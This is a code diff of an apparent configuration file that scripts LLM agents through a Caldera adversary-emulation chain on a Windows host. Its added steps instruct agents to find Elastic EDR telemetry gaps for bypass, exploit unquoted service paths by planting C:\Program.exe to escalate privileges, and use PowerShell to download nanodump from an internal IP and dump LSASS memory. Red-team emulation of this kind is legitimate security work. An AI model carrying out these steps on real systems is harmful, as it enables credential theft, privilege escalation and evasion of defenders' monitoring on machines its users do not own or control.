@@ -34,22 +34,30 @@ actions = {
             "agent": "caldera_agent",
         },
     ],
+    "IDENTIFY_EDR_BYPASS_TECHNIQUES": [
+        {
+            "message": "Identify the EDR telemetry gaps for Elastic using https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/EDR_telem.json",
+            "summary_method": "last_msg",
+            "carryover": "Output the list of the telemetry sub-categories. Include a title above the list making it clear these are telemetry gaps.",
+            "agent": "internet_agent",
+        }
+    ],
     "DETECT_EDR": [
         {
             "message": "Download https://raw.githubusercontent.com/tsale/EDR-Telemetry/main/README.md",
             "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the list of ALL security products mentioned in the README.",
+            "carryover": "Replace this placeholder with the list of ALL security products mentioned in the README. Add a title to the list.",
             "agent": "internet_agent",
         },
         {
             "message": "List all Windows services on the active Caldera agent",
             "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the list of ALL Windows service names WITHOUT WINDOWS in their path name.",
+            "carryover": "Replace this placeholder with the list of ALL Windows service names",
             "agent": "caldera_agent",
         },
         {
             "message": """Identify which security services are likely running on the active Caldera agent based on the provided context.
-            Do a fuzzy match comparing the list of running services with the list of security products. Partial matches are OK.
+            Do this by comparing the list of running services with the list of popular security products.
             It's possible that multiple security agents are running.""",
             "summary_method": "reflection_with_llm",
             "agent": "text_analyst_agent",
@@ -62,13 +70,28 @@ actions = {
             "agent": "caldera_agent",
         }
     ],
-    "DOWNLOAD_AND_RUN_NANODUMP": [
+    "ELEVATE_PRIVILEGES": [
         {
-            "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
+            "message": "List all Windows services on the active Caldera agent",
             "summary_method": "last_msg",
-            "carryover": "Replace this placeholder with the local full path to the downloaded nanodump executable.",
+            "carryover": "Replace this placeholder with the list of ALL Windows service names and their Paths",
             "agent": "caldera_agent",
         },
+        {
+            "message": "Analyze the list of services and search for the ones where the path is NOT surrounded by quotes",
+            "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with the list of filtered out Windows service names and their Paths",
+            "agent": "text_analyst_agent",
+        },
+        {
+            "message": """Describe how the services with paths not surrounded by quotes can be used to elevate privileges. Be specific about which paths we could use and how we could use them.
+            Describe how we can use this to hijacking the Windows service Execution Flow by putting our binary as C:\\Program.exe. Write this in the present, example 'We will now use the service ...'
+            """,
+            "summary_method": "last_msg",
+            "agent": "text_analyst_agent",
+        },
+    ],
+    "DOWNLOAD_AND_RUN_NANODUMP": [
         {
             "message": "A complete list of all the available nanodump flags from https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
             "summary_method": "last_msg",
@@ -76,7 +99,13 @@ actions = {
             "agent": "internet_agent",
         },
         {
-            "message": "Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\\temp.",
+            "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
+            "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with the local full path to the downloaded nanodump executable.",
+            "agent": "caldera_agent",
+        },
+        {
+            "message": "Use powershell to run the downloaded nanodump.x64.exe executable located in C:\\temp (use the full path) to dump LSASS without forking. Write the dump to C:\\temp.",
             "summary_method": "last_msg",
             "carryover": "Replace this placeholder with the path to the dumped local LSASS output file.",
             "agent": "caldera_agent",
@@ -99,4 +128,6 @@ scenarios = {
     "DETECT_EDR": ["COLLECT_CALDERA_INFO", "DETECT_EDR"],
     "HELLO_CALDERA": ["COLLECT_CALDERA_INFO", "HELLO_CALDERA"],
     "DETECT_AGENT_PRIVILEGES": ["COLLECT_CALDERA_INFO", "DETECT_AGENT_PRIVILEGES"],
+    "IDENTIFY_EDR_BYPASS_TECHNIQUES": ["IDENTIFY_EDR_BYPASS_TECHNIQUES"],
+    "ELEVATE_PRIVILEGES": ["COLLECT_CALDERA_INFO", "ELEVATE_PRIVILEGES"],
 }
